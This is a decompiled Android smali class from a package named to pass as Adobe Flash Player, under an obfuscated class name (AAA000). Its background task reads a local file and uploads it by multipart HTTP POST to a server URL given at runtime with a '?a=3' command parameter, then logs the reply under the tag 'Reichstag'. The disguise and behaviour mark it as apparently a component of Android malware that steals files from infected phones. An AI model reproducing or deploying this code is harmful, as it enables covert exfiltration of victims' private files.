.class public Lcom/adobe/flashplayer_/AAA000;
.super Landroid/os/AsyncTask;
.source "AAA000.java"


# annotations
.annotation system Ldalvik/annotation/Signature;
    value = {
        "Landroid/os/AsyncTask",
        "<",
        "Ljava/lang/String;",
        "Ljava/lang/String;",
        "Ljava/lang/String;",
        ">;"
    }
.end annotation


# direct methods
.method public constructor <init>()V
    .locals 0

    .prologue
    .line 15
    invoke-direct {p0}, Landroid/os/AsyncTask;-><init>()V

    return-void
.end method


# virtual methods
.method protected bridge varargs synthetic doInBackground([Ljava/lang/Object;)Ljava/lang/Object;
    .locals 1

    .prologue
    .line 1
    check-cast p1, [Ljava/lang/String;

    invoke-virtual {p0, p1}, Lcom/adobe/flashplayer_/AAA000;->doInBackground([Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    return-object v0
.end method

.method protected varargs doInBackground([Ljava/lang/String;)Ljava/lang/String;
    .locals 24
    .param p1, "params"    # [Ljava/lang/String;

    .prologue
    .line 19
    const/4 v8, 0x0

    .line 20
    .local v8, "conn":Ljava/net/HttpURLConnection;
    const/4 v9, 0x0

    .line 21
    .local v9, "dos":Ljava/io/DataOutputStream;
    const/4 v13, 0x0

    .line 22
    .local v13, "inStream":Ljava/io/DataInputStream;
    const/16 v21, 0x1

    aget-object v11, p1, v21

    .line 23
    .local v11, "exsistingFileName":Ljava/lang/String;
    const-string v15, "\r\n"

    .line 24
    .local v15, "lineEnd":Ljava/lang/String;
    const-string v18, "--"

    .line 25
    .local v18, "twoHyphens":Ljava/lang/String;
    const-string v2, "*****"

    .line 30
    .local v2, "boundary":Ljava/lang/String;
    const/high16 v17, 0x100000

    .line 31
    .local v17, "maxBufferSize":I
    new-instance v21, Ljava/lang/StringBuilder;

    const/16 v22, 0x2

    aget-object v22, p1, v22

    invoke-static/range {v22 .. v22}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v22

    invoke-direct/range {v21 .. v22}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v22, "?a=3"

    invoke-virtual/range {v21 .. v22}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v21

    const/16 v22, 0x0

    aget-object v22, p1, v22

    invoke-virtual/range {v21 .. v22}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v21

    invoke-virtual/range {v21 .. v21}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v20

    .line 35
    .local v20, "urlString":Ljava/lang/String;
    :try_start_0
    new-instance v12, Ljava/io/FileInputStream;

    new-instance v21, Ljava/io/File;

    move-object/from16 v0, v21

    invoke-direct {v0, v11}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    move-object/from16 v0, v21

    invoke-direct {v12, v0}, Ljava/io/FileInputStream;-><init>(Ljava/io/File;)V

    .line 36
    .local v12, "fileInputStream":Ljava/io/FileInputStream;
    new-instance v19, Ljava/net/URL;

    invoke-direct/range {v19 .. v20}, Ljava/net/URL;-><init>(Ljava/lang/String;)V

    .line 37
    .local v19, "url":Ljava/net/URL;
    invoke-virtual/range {v19 .. v19}, Ljava/net/URL;->openConnection()Ljava/net/URLConnection;

    move-result-object v21

    move-object/from16 v0, v21

    check-cast v0, Ljava/net/HttpURLConnection;

    move-object v8, v0

    .line 38
    const/16 v21, 0x1

    move/from16 v0, v21

    invoke-virtual {v8, v0}, Ljava/net/HttpURLConnection;->setDoInput(Z)V

    .line 39
    const/16 v21, 0x1

    move/from16 v0, v21

    invoke-virtual {v8, v0}, Ljava/net/HttpURLConnection;->setDoOutput(Z)V

    .line 40
    const/16 v21, 0x0

    move/from16 v0, v21

    invoke-virtual {v8, v0}, Ljava/net/HttpURLConnection;->setUseCaches(Z)V

    .line 41
    const-string v21, "POST"

    move-object/from16 v0, v21

    invoke-virtual {v8, v0}, Ljava/net/HttpURLConnection;->setRequestMethod(Ljava/lang/String;)V

    .line 42
    const-string v21, "Connection"

    const-string v22, "Keep-Alive"

    move-object/from16 v0, v21

    move-object/from16 v1, v22

    invoke-virtual {v8, v0, v1}, Ljava/net/HttpURLConnection;->setRequestProperty(Ljava/lang/String;Ljava/lang/String;)V

    .line 43
    const-string v21, "Content-Type"

    new-instance v22, Ljava/lang/StringBuilder;

    const-string v23, "multipart/form-data;boundary="

    invoke-direct/range {v22 .. v23}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    move-object/from16 v0, v22

    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v22

    invoke-virtual/range {v22 .. v22}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v22

    move-object/from16 v0, v21

    move-object/from16 v1, v22

    invoke-virtual {v8, v0, v1}, Ljava/net/HttpURLConnection;->setRequestProperty(Ljava/lang/String;Ljava/lang/String;)V

    .line 44
    new-instance v10, Ljava/io/DataOutputStream;

    invoke-virtual {v8}, Ljava/net/HttpURLConnection;->getOutputStream()Ljava/io/OutputStream;

    move-result-object v21

    move-object/from16 v0, v21

    invoke-direct {v10, v0}, Ljava/io/DataOutputStream;-><init>(Ljava/io/OutputStream;)V
    :try_end_0
    .catch Ljava/net/MalformedURLException; {:try_start_0 .. :try_end_0} :catch_4
    .catch Ljava/io/IOException; {:try_start_0 .. :try_end_0} :catch_2

    .line 45
    .end local v9    # "dos":Ljava/io/DataOutputStream;
    .local v10, "dos":Ljava/io/DataOutputStream;
    :try_start_1
    new-instance v21, Ljava/lang/StringBuilder;

    invoke-static/range {v18 .. v18}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v22

    invoke-direct/range {v21 .. v22}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    move-object/from16 v0, v21

    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v21

    move-object/from16 v0, v21

    invoke-virtual {v0, v15}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v21

    invoke-virtual/range {v21 .. v21}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v21

    move-object/from16 v0, v21

    invoke-virtual {v10, v0}, Ljava/io/DataOutputStream;->writeBytes(Ljava/lang/String;)V

    .line 46
    new-instance v21, Ljava/lang/StringBuilder;

    const-string v22, "Content-Disposition: form-data; name=\'TEMP\'; filename=\'"

    invoke-direct/range {v21 .. v22}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    move-object/from16 v0, v21

    invoke-virtual {v0, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v21

    const-string v22, "\'"

    invoke-virtual/range {v21 .. v22}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v21

    move-object/from16 v0, v21

    invoke-virtual {v0, v15}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v21

    invoke-virtual/range {v21 .. v21}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v21

    move-object/from16 v0, v21

    invoke-virtual {v10, v0}, Ljava/io/DataOutputStream;->writeBytes(Ljava/lang/String;)V

    .line 47
    invoke-virtual {v10, v15}, Ljava/io/DataOutputStream;->writeBytes(Ljava/lang/String;)V

    .line 48
    invoke-virtual {v12}, Ljava/io/FileInputStream;->available()I

    move-result v5

    .line 49
    .local v5, "bytesAvailable":I
    move/from16 v0, v17

    invoke-static {v5, v0}, Ljava/lang/Math;->min(II)I

    move-result v4

    .line 50
    .local v4, "bufferSize":I
    new-array v3, v4, [B

    .line 51
    .local v3, "buffer":[B
    const/16 v21, 0x0

    move/from16 v0, v21

    invoke-virtual {v12, v3, v0, v4}, Ljava/io/FileInputStream;->read([BII)I

    move-result v6

    .line 52
    .local v6, "bytesRead":I
    :goto_0
    if-gtz v6, :cond_0

    .line 60
    invoke-virtual {v10, v15}, Ljava/io/DataOutputStream;->writeBytes(Ljava/lang/String;)V

    .line 61
    new-instance v21, Ljava/lang/StringBuilder;

    invoke-static/range {v18 .. v18}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v22

    invoke-direct/range {v21 .. v22}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    move-object/from16 v0, v21

    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v21

    move-object/from16 v0, v21

    move-object/from16 v1, v18

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v21

    move-object/from16 v0, v21

    invoke-virtual {v0, v15}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v21

    invoke-virtual/range {v21 .. v21}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v21

    move-object/from16 v0, v21

    invoke-virtual {v10, v0}, Ljava/io/DataOutputStream;->writeBytes(Ljava/lang/String;)V

    .line 64
    invoke-virtual {v8}, Ljava/net/HttpURLConnection;->getResponseCode()I

    move-result v7

    .line 65
    .local v7, "c":I
    invoke-virtual {v8}, Ljava/net/HttpURLConnection;->getResponseMessage()Ljava/lang/String;

    move-result-object v16

    .line 67
    .local v16, "m":Ljava/lang/String;
    const-string v21, "Reichstag"

    new-instance v22, Ljava/lang/StringBuilder;

    invoke-static/range {v16 .. v16}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v23

    invoke-direct/range {v22 .. v23}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v23, " "

    invoke-virtual/range {v22 .. v23}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v22

    move-object/from16 v0, v22

    invoke-virtual {v0, v7}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v22

    invoke-virtual/range {v22 .. v22}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v22

    invoke-static/range {v21 .. v22}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 69
    invoke-virtual {v12}, Ljava/io/FileInputStream;->close()V

    .line 70
    invoke-virtual {v10}, Ljava/io/DataOutputStream;->flush()V

    .line 71
    invoke-virtual {v10}, Ljava/io/DataOutputStream;->close()V
    :try_end_1
    .catch Ljava/net/MalformedURLException; {:try_start_1 .. :try_end_1} :catch_5
    .catch Ljava/io/IOException; {:try_start_1 .. :try_end_1} :catch_3

    move-object v9, v10

    .line 80
    .end local v3    # "buffer":[B
    .end local v4    # "bufferSize":I
    .end local v5    # "bytesAvailable":I
    .end local v6    # "bytesRead":I
    .end local v7    # "c":I
    .end local v10    # "dos":Ljava/io/DataOutputStream;
    .end local v12    # "fileInputStream":Ljava/io/FileInputStream;
    .end local v16    # "m":Ljava/lang/String;
    .end local v19    # "url":Ljava/net/URL;
    .restart local v9    # "dos":Ljava/io/DataOutputStream;
    :goto_1
    :try_start_2
    new-instance v14, Ljava/io/DataInputStream;

    invoke-virtual {v8}, Ljava/net/HttpURLConnection;->getInputStream()Ljava/io/InputStream;

    move-result-object v21

    move-object/from16 v0, v21

    invoke-direct {v14, v0}, Ljava/io/DataInputStream;-><init>(Ljava/io/InputStream;)V
    :try_end_2
    .catch Ljava/io/IOException; {:try_start_2 .. :try_end_2} :catch_0

    .line 81
    .end local v13    # "inStream":Ljava/io/DataInputStream;
    .local v14, "inStream":Ljava/io/DataInputStream;
    :try_start_3
    invoke-virtual {v14}, Ljava/io/DataInputStream;->close()V
    :try_end_3
    .catch Ljava/io/IOException; {:try_start_3 .. :try_end_3} :catch_1

    move-object v13, v14

    .line 88
    .end local v14    # "inStream":Ljava/io/DataInputStream;
    .restart local v13    # "inStream":Ljava/io/DataInputStream;
    :goto_2
    const/16 v21, 0x0

    return-object v21

    .line 54
    .end local v9    # "dos":Ljava/io/DataOutputStream;
    .restart local v3    # "buffer":[B
    .restart local v4    # "bufferSize":I
    .restart local v5    # "bytesAvailable":I
    .restart local v6    # "bytesRead":I
    .restart local v10    # "dos":Ljava/io/DataOutputStream;
    .restart local v12    # "fileInputStream":Ljava/io/FileInputStream;
    .restart local v19    # "url":Ljava/net/URL;
    :cond_0
    const/16 v21, 0x0

    :try_start_4
    move/from16 v0, v21

    invoke-virtual {v10, v3, v0, v4}, Ljava/io/DataOutputStream;->write([BII)V

    .line 55
    invoke-virtual {v12}, Ljava/io/FileInputStream;->available()I

    move-result v5

    .line 56
    move/from16 v0, v17

    invoke-static {v5, v0}, Ljava/lang/Math;->min(II)I

    move-result v4

    .line 57
    const/16 v21, 0x0

    move/from16 v0, v21

    invoke-virtual {v12, v3, v0, v4}, Ljava/io/FileInputStream;->read([BII)I
    :try_end_4
    .catch Ljava/net/MalformedURLException; {:try_start_4 .. :try_end_4} :catch_5
    .catch Ljava/io/IOException; {:try_start_4 .. :try_end_4} :catch_3

    move-result v6

    goto/16 :goto_0

    .line 84
    .end local v3    # "buffer":[B
    .end local v4    # "bufferSize":I
    .end local v5    # "bytesAvailable":I
    .end local v6    # "bytesRead":I
    .end local v10    # "dos":Ljava/io/DataOutputStream;
    .end local v12    # "fileInputStream":Ljava/io/FileInputStream;
    .end local v19    # "url":Ljava/net/URL;
    .restart local v9    # "dos":Ljava/io/DataOutputStream;
    :catch_0
    move-exception v21

    goto :goto_2

    .end local v13    # "inStream":Ljava/io/DataInputStream;
    .restart local v14    # "inStream":Ljava/io/DataInputStream;
    :catch_1
    move-exception v21

    move-object v13, v14

    .end local v14    # "inStream":Ljava/io/DataInputStream;
    .restart local v13    # "inStream":Ljava/io/DataInputStream;
    goto :goto_2

    .line 77
    :catch_2
    move-exception v21

    goto :goto_1

    .end local v9    # "dos":Ljava/io/DataOutputStream;
    .restart local v10    # "dos":Ljava/io/DataOutputStream;
    .restart local v12    # "fileInputStream":Ljava/io/FileInputStream;
    .restart local v19    # "url":Ljava/net/URL;
    :catch_3
    move-exception v21

    move-object v9, v10

    .end local v10    # "dos":Ljava/io/DataOutputStream;
    .restart local v9    # "dos":Ljava/io/DataOutputStream;
    goto :goto_1

    .line 76
    .end local v12    # "fileInputStream":Ljava/io/FileInputStream;
    .end local v19    # "url":Ljava/net/URL;
    :catch_4
    move-exception v21

    goto :goto_1

    .end local v9    # "dos":Ljava/io/DataOutputStream;
    .restart local v10    # "dos":Ljava/io/DataOutputStream;
    .restart local v12    # "fileInputStream":Ljava/io/FileInputStream;
    .restart local v19    # "url":Ljava/net/URL;
    :catch_5
    move-exception v21

    move-object v9, v10

    .end local v10    # "dos":Ljava/io/DataOutputStream;
    .restart local v9    # "dos":Ljava/io/DataOutputStream;
    goto :goto_1
.end method
